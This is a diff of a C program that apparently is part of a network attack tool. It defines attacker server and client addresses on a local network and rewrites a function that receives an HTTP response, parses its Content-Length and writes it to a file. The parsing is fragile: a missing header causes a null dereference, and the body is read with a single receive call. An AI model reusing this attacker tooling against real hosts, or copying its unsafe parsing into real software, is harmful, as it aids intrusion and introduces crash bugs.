@@ -12,6 +12,8 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 
+#define __MY_DEBUG__
+
 
 #define ATTACKER_SERVER_ADDR 192, 168, 1, 201
 #define ATTACKER_CLIENT_ADDR 192, 168, 1, 202
@@ -164,16 +166,41 @@ void _connect(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
 }
 
 void recv_write(int32_t sockfd, FILE *file) {
-    char buf[16];
+    enum {
+        CHUNK = 16
+    };
+    char * buf = malloc(CHUNK);
+    size_t size = 0;
+    *buf = 0;
+    char *header_end=0;
+    size_t recvd;
 
     while (1) {
-        memset(buf, 0, sizeof(buf));
-        size_t recvd = _recv(sockfd, buf, sizeof(buf));
+        recvd = _recv(sockfd, buf + size, CHUNK - 1);
         if (!recvd) {
             break;
         }
-        _fwrite(buf, recvd, 1, file);
+
+        size += recvd;
+        buf = realloc(buf, size+CHUNK);
+        buf[size] = 0;
+
+        header_end = strstr(buf, "\r\n\r\n");
+
+        if (header_end) {
+            break;
+        }
     }
+    char Content_Length[] = "Content-Length: ";
+    size_t content_len = (size_t)atoi(strstr(buf, Content_Length) + sizeof(Content_Length)-1);
+    size_t body_recvd = size - (size_t)(header_end+4-buf); //how much we already received from the body after the header ends
+    size_t body_left = content_len - body_recvd;
+    buf = realloc(buf, body_left+size+1);
+    recvd = _recv(sockfd, buf + size, body_left);
+    size = size + recvd;
+
+    _fwrite(buf, size, 1, file);
+    free(buf);
 }
 
 int32_t main() {
@@ -191,4 +218,5 @@ int32_t main() {
     fclose(file);
     close(sockfd);
     close(clientfd);
+
 }
